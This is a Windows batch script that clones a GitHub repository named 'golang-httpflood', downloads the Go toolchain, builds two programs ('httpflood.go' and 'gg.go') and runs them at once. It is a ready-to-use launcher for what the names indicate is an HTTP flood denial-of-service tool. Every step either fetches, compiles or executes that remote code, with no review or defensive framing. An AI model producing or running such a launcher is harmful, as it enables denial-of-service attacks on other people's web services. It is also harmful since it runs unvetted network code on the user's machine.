@echo off
REM Clone the repository into the specified directory
git clone https://github.com/murmurlab/golang-httpflood %USERPROFILE%\flo

REM Download Go
wget https://go.dev/dl/go1.19.4.windows-amd64.zip -O %USERPROFILE%\gol.zip

REM Extract Go (change to tar if on Linux)
tar -xf %USERPROFILE%\gol.zip -C %USERPROFILE%

REM Set the Go binary path
set GOPATH=%USERPROFILE%\go
set PATH=%PATH%;%GOPATH%\bin

REM Build the Go files
%GOPATH%\bin\go build %USERPROFILE%\flo\httpflood.go
%GOPATH%\bin\go build %USERPROFILE%\flo\gg.go

REM Run the executables
httpflood.exe
gg.exe

